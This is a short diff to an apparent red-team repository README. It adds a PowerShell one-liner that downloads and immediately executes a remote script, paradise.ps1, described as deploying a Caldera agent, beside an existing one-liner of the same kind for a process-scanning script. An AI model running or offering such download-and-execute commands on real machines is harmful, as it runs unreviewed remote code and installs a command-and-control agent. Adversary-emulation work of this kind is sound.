@@ -60,3 +60,9 @@ Performs a scan of all running processes and scheduled tasks
 ``` powershell
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/lumpen.ps1') 
 ```
+
+## paradise.ps1
+Caldera agent deployment via PowerShell
+``` powershell
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/paradise.ps1') 
+```
